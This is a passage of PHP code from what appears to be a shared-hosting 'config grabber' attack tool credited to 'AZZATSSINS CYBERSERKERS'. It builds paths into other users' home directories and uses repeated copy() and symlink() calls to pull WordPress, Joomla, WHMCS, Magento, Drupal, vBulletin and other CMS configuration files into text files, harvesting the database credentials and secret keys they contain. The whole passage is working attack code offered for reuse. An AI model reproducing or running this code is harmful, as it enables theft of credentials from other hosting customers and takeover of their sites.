copy('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
/*You Can ReCoded But Don't Change Â©CopyRight*/
/*e.g: Recoded By xxxxxx & Â© AZZATSSINS*/
symlink('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ JOOMLA.txt');
/* Â© BY AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.' <~ OPENCART.txt');
copy('/'.$home.'/'.$user.'/public_html/sites/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/'.$home.'/'.$user.'/public_html/sites/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.' <~ PHPBB.txt');
copy('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/config.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/config.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/'.$home.'/'.$user.'/public_html/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.' <~ OTHER.txt');
/* fb: /AZZATSSINS.CYBERSERKERS */
copy('/var/www/wp-config.php','WORDPRESS.txt');
copy('/var/www/configuration.php','JOOMLA.txt');
copy('/var/www/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/config.php','OTHER.txt');
copy('/var/www/config/koneksi.php','OTHER.txt');
copy('/var/www/include/config.php','OTHER.txt');
copy('/var/www/connect.php','OTHER.txt');
copy('/var/www/config/connect.php','OTHER.txt');
copy('/var/www/include/connect.php','OTHER.txt');
copy('/var/www/html/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/configuration.php','JOOMLA.txt');
copy('/var/www/html/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/html/config.php','OTHER.txt');
copy('/var/www/html/config/koneksi.php','OTHER.txt');
copy('/var/www/html/include/config.php','OTHER.txt');
copy('/var/www/html/connect.php','OTHER.txt');
copy('/var/www/html/config/connect.php','OTHER.txt');
copy('/var/www/html/include/connect.php','OTHER.txt');
symlink('/var/www/wp-config.php','WORDPRESS.txt');
symlink('/var/www/configuration.php','JOOMLA.txt');
symlink('/var/www/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/config.php','OTHER.txt');
symlink('/var/www/config/koneksi.php','OTHER.txt');
symlink('/var/www/include/config.php','OTHER.txt');
symlink('/var/www/connect.php','OTHER.txt');
symlink('/var/www/config/connect.php','OTHER.txt');
symlink('/var/www/include/connect.php','OTHER.txt');
symlink('/var/www/html/wp-config.php','WORDPRESS.txt');
symlink('/var/www/html/configuration.php','JOOMLA.txt');
symlink('/var/www/html/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/html/config.php','OTHER.txt');
symlink('/var/www/html/config/koneksi.php','OTHER.txt');
symlink('/var/www/html/include/config.php','OTHER.txt');
symlink('/var/www/html/connect.php','OTHER.txt');
symlink('/var/www/html/config/connect.php','OTHER.txt');
symlink('/var/www/html/include/connect.php','OTHER.txt');
copy('/'.$home.'/'.$user.'/www/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/www/suspended.page/index.html',$user.' <~ RESELLER.txt');
symlink('/'.$home.'/'.$user.'/www/.accesshash',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/www/wp-config.php',$user.' <~ WORDPRESS.txt'); 
copy('/'.$home.'/'.$user.'/www/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/account/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/buy/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/central/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/clients/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/core/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/company/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/customer/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/customers/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/bill/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/billing/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/finance/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/host/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/klien/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/manage/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/manager/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/member/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/members/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/my/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/order/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/orders/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/painel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/panel/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/panels/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/portal/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/portals/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

copy('/'.$home.'/'.$user.'/www/secure/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/support/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/supports/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/web/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/www/WHMCS/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/wp-config.php',$user.' <~ WORDPRESS.txt'); 
symlink('/'.$home.'/'.$user.'/www/configuration.php',$user.' <~ WHMCS or JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/account/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/buy/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/checkout/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/central/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/clienti/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/cliente/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/clientes/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/clients/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/clientarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/clientsarea/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/client-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/clients-area/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/clientzone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/client-zone/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/core/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/company/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/customer/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/customers/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/bill/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/billing/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/finance/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/financeiro/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/host/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/hosts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/hosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/hostings/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/klien/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/manage/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/manager/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/member/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/members/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/my/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/myaccount/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/my-account/client/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/myaccounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/my-accounts/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/order/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/orders/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/painel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/panel/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/panels/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/portal/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/portals/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/purchase/configuration.php',$user.' <~ WHMCS.txt'); 

symlink('/'.$home.'/'.$user.'/www/secure/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/support/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/supporte/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/supports/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/web/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/webhost/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/webhosting/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/whmcs2/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/Whm/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/Whmcs/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/WHM/configuration.php',$user.' <~ WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/www/WHMCS/configuration.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/www/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
/* CODED BY AZZATSSINS CYBERSERKERS */
copy('/'.$home.'/'.$user.'/www/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/www/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/submitticket.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/www/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/www/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/'.$home.'/'.$user.'/www/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/'.$home.'/'.$user.'/www/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/www/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/www/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
/*You Can ReCoded But Don't Change Â©CopyRight*/
/*e.g: Recoded By xxxxxx & Â© AZZATSSINS*/
symlink('/'.$home.'/'.$user.'/www/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/'.$home.'/'.$user.'/www/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/portal/configuration.php',$user.' <~ JOOMLA.txt');
/* Â© BY AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/www/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/www/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/'.$home.'/'.$user.'/www/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/'.$home.'/'.$user.'/www/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/'.$home.'/'.$user.'/www/admin/config.php',$user.' <~ OPENCART.txt');
copy('/'.$home.'/'.$user.'/www/sites/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/'.$home.'/'.$user.'/www/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/'.$home.'/'.$user.'/www/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/'.$home.'/'.$user.'/www/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/'.$home.'/'.$user.'/www/sites/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/'.$home.'/'.$user.'/www/forum/config.php',$user.' <~ PHPBB.txt');
copy('/'.$home.'/'.$user.'/www/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/www/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/www/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/www/config.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/www/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/'.$home.'/'.$user.'/www/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/www/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/www/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/www/config.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/www/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/'.$home.'/'.$user.'/www/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/www/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/www/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/www/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/www/application/config/database.php',$user.' <~ OTHER.txt');
